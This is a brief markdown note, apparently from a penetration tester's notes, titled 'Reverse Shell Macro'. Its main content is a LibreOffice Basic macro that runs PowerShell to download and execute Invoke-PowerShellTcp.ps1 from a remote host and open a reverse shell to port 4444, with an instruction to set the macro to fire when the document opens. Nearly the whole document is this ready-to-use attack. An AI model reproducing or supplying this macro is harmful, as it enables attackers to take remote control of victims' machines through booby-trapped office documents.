# Reverse Shell Macro
If we know a target is using LibreOffice, we can get a reverse shell into their machine using a custom macro.

### Macro
```
REM  *****  BASIC  *****

Sub Main
  Shell("cmd /c powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.49.163:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.49.163 -Port 4444")
End Sub
```

### Config
Set the macro to execute on document open.

![[Pasted image 20220911172918.png]]